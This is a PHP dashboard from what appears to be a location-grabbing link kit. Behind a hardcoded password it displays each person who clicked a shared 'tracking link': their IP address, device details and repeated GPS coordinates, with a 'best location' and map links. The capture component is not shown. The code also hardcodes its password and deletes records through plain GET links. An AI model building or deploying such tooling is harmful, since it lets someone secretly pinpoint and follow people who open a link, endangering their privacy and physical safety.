<?php
// view_locations.php - View all recorded locations grouped by click

$PASSWORD = 'mpsc2026';
session_start();
$authenticated = isset($_SESSION['loc_auth']) && $_SESSION['loc_auth'] === true;

if (isset($_POST['password'])) {
    if ($_POST['password'] === $PASSWORD) { $_SESSION['loc_auth'] = true; $authenticated = true; }
    else { $loginError = 'Wrong password'; }
}
if (isset($_GET['logout'])) { session_destroy(); header('Location: view_locations.php'); exit; }
if (isset($_GET['api']) && $authenticated) {
    header('Content-Type: application/json');
    $f = __DIR__ . '/locations.json';
    echo file_exists($f) ? file_get_contents($f) : '[]';
    exit;
}
if (isset($_GET['delete']) && $authenticated) {
    $f = __DIR__ . '/locations.json';
    if (file_exists($f)) {
        $d = json_decode(file_get_contents($f), true) ?: [];
        $d = array_values(array_filter($d, function($c) { return $c['session_id'] !== $_GET['delete']; }));
        // Re-number clicks
        foreach ($d as $i => &$c) { $c['click_number'] = $i + 1; }
        file_put_contents($f, json_encode($d, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    }
    header('Location: view_locations.php'); exit;
}
if (isset($_GET['clear_all']) && $authenticated) {
    file_put_contents(__DIR__ . '/locations.json', '[]');
    header('Location: view_locations.php'); exit;
}

$clicks = [];
$f = __DIR__ . '/locations.json';
if ($authenticated && file_exists($f)) {
    $clicks = json_decode(file_get_contents($f), true) ?: [];
    $clicks = array_reverse($clicks);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📍 Location Records</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 900px; margin: 0 auto; }
        h1 { color: #333; margin-bottom: 5px; }
        .subtitle { color: #888; font-size: 14px; margin-bottom: 25px; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 10px; margin-bottom: 25px;
        }
        .header-actions a {
            display: inline-block; padding: 8px 16px; border-radius: 8px;
            text-decoration: none; font-size: 13px; font-weight: 500;
        }
        .btn-danger { background: #dc3545; color: white; }
        .btn-secondary { background: #6c757d; color: white; }
        .btn-primary { background: #667eea; color: white; }
        .login-card {
            background: white; border-radius: 16px; padding: 40px;
            max-width: 360px; margin: 80px auto; text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
        }
        .login-card h2 { margin-bottom: 20px; color: #333; }
        .login-card input[type="password"] {
            width: 100%; padding: 12px; border: 2px solid #e0e0e0;
            border-radius: 10px; font-size: 15px; margin-bottom: 15px; outline: none;
        }
        .login-card input:focus { border-color: #667eea; }
        .login-card button {
            width: 100%; padding: 12px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white; border: none; border-radius: 10px;
            font-size: 15px; font-weight: 600; cursor: pointer;
        }
        .login-error { color: #dc3545; font-size: 13px; margin-bottom: 10px; }
        .badge {
            display: inline-block; background: #667eea; color: white;
            padding: 3px 10px; border-radius: 20px; font-size: 13px; font-weight: 600;
        }

        /* Click card */
        .click-card {
            background: white; border-radius: 14px; padding: 20px 24px;
            margin-bottom: 16px; box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .click-header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 14px; flex-wrap: wrap; gap: 8px;
        }
        .click-number {
            font-size: 20px; font-weight: 800; color: #667eea;
        }
        .click-meta { font-size: 12px; color: #999; }
        .best-location {
            background: linear-gradient(135deg, #e8f5e9, #f1f8e9);
            border: 1px solid #c8e6c9;
            border-radius: 12px; padding: 14px 18px; margin-bottom: 14px;
        }
        .best-label {
            font-size: 11px; font-weight: 700; color: #2e7d32;
            text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px;
        }
        .best-coords {
            font-size: 18px; font-weight: 700; color: #333;
        }
        .best-accuracy { font-size: 12px; color: #666; margin-top: 2px; }
        .device-info {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 6px; margin-bottom: 14px;
        }
        .device-info div { font-size: 12px; color: #777; }
        .device-info strong { color: #555; }

        /* Readings toggle */
        .readings-toggle {
            background: none; border: 1px solid #e0e0e0; border-radius: 8px;
            padding: 8px 14px; font-size: 12px; color: #667eea; cursor: pointer;
            font-weight: 600; width: 100%; margin-bottom: 10px;
        }
        .readings-toggle:hover { background: #f8f9fa; }
        .readings-list { display: none; }
        .readings-list.open { display: block; }
        .reading-row {
            display: flex; justify-content: space-between; align-items: center;
            padding: 8px 12px; border-bottom: 1px solid #f0f0f0; font-size: 12px;
        }
        .reading-row:last-child { border-bottom: none; }
        .reading-num { font-weight: 700; color: #667eea; width: 30px; }
        .reading-coords { color: #333; flex: 1; }
        .reading-acc { color: #999; width: 70px; text-align: right; }
        .reading-link { margin-left: 8px; }
        .reading-link a { color: #2e7d32; text-decoration: none; font-size: 11px; }

        .click-actions { display: flex; gap: 10px; margin-top: 12px; }
        .click-actions a {
            font-size: 13px; padding: 6px 14px; border-radius: 8px;
            text-decoration: none; font-weight: 500;
        }
        .map-link { background: #e8f5e9; color: #2e7d32; }
        .delete-link { background: #fce4ec; color: #c62828; }

        .empty-state {
            text-align: center; padding: 60px; color: #999;
            background: white; border-radius: 14px;
        }
        .empty-state .icon { font-size: 50px; margin-bottom: 10px; }
    </style>
</head>
<body>
<?php if (!$authenticated): ?>
    <div class="login-card">
        <h2>🔒 View Locations</h2>
        <?php if (isset($loginError)): ?><p class="login-error"><?= htmlspecialchars($loginError) ?></p><?php endif; ?>
        <form method="POST">
            <input type="password" name="password" placeholder="Enter password" autofocus required>
            <button type="submit">Unlock</button>
        </form>
    </div>
<?php else: ?>
    <div class="container">
        <div class="header">
            <div>
                <h1>📍 Location Records <span class="badge"><?= count($clicks) ?> clicks</span></h1>
                <p class="subtitle">Grouped by click (newest first)</p>
            </div>
            <div class="header-actions">
                <a href="view_locations.php?api=1" target="_blank" class="btn-primary">📄 JSON</a>
                <?php if (count($clicks) > 0): ?>
                    <a href="view_locations.php?clear_all=1" class="btn-danger" onclick="return confirm('Delete ALL records?')">🗑️ Clear All</a>
                <?php endif; ?>
                <a href="view_locations.php?logout=1" class="btn-secondary">🚪 Logout</a>
            </div>
        </div>

        <?php if (empty($clicks)): ?>
            <div class="empty-state">
                <div class="icon">📭</div>
                <p>No locations recorded yet.</p>
                <p style="margin-top:5px; font-size:13px;">Share the tracking link to start capturing.</p>
            </div>
        <?php else: ?>
            <?php foreach ($clicks as $click): ?>
                <div class="click-card">
                    <div class="click-header">
                        <span class="click-number">Click #<?= intval($click['click_number'] ?? 0) ?></span>
                        <span class="click-meta">
                            <?= htmlspecialchars($click['started_at'] ?? 'N/A') ?>
                            &nbsp;·&nbsp; <?= intval($click['total_readings'] ?? 0) ?> readings
                        </span>
                    </div>

                    <?php if (!empty($click['best_location'])): ?>
                        <div class="best-location">
                            <div class="best-label">📡 Best Location (Most Accurate)</div>
                            <div class="best-coords">
                                <?= number_format($click['best_location']['latitude'], 6) ?>,
                                <?= number_format($click['best_location']['longitude'], 6) ?>
                            </div>
                            <div class="best-accuracy">
                                Accuracy: <?= $click['best_location']['accuracy'] ? round($click['best_location']['accuracy']) . 'm' : 'N/A' ?>
                            </div>
                        </div>
                    <?php endif; ?>

                    <div class="device-info">
                        <div><strong>IP:</strong> <?= htmlspecialchars($click['ip'] ?? 'N/A') ?></div>
                        <div><strong>Screen:</strong> <?= htmlspecialchars($click['screenRes'] ?? 'N/A') ?></div>
                        <div><strong>Language:</strong> <?= htmlspecialchars($click['language'] ?? 'N/A') ?></div>
                        <div><strong>Device:</strong> <?= htmlspecialchars(substr($click['userAgent'] ?? 'N/A', 0, 50)) ?>...</div>
                    </div>

                    <?php if (!empty($click['readings'])): ?>
                        <button class="readings-toggle" onclick="this.nextElementSibling.classList.toggle('open'); this.textContent = this.nextElementSibling.classList.contains('open') ? '▲ Hide all readings' : '▼ Show all <?= count($click['readings']) ?> readings';">
                            ▼ Show all <?= count($click['readings']) ?> readings
                        </button>
                        <div class="readings-list">
                            <?php foreach ($click['readings'] as $r): ?>
                                <div class="reading-row">
                                    <span class="reading-num">#<?= intval($r['reading'] ?? 0) ?></span>
                                    <span class="reading-coords"><?= number_format($r['latitude'], 6) ?>, <?= number_format($r['longitude'], 6) ?></span>
                                    <span class="reading-acc"><?= $r['accuracy'] ? round($r['accuracy']) . 'm' : '—' ?></span>
                                    <span class="reading-link"><a href="<?= htmlspecialchars($r['google_maps'] ?? '#') ?>" target="_blank">🗺️</a></span>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>

                    <div class="click-actions">
                        <?php if (!empty($click['best_location']['google_maps'])): ?>
                            <a href="<?= htmlspecialchars($click['best_location']['google_maps']) ?>" target="_blank" class="map-link">🗺️ Open Best in Maps</a>
                        <?php endif; ?>
                        <a href="view_locations.php?delete=<?= urlencode($click['session_id'] ?? '') ?>" class="delete-link" onclick="return confirm('Delete Click #<?= intval($click['click_number'] ?? 0) ?>?')">🗑️ Delete</a>
                    </div>
                </div>
            <?php endforeach; ?>
        <?php endif; ?>
    </div>
<?php endif; ?>
</body>
</html>
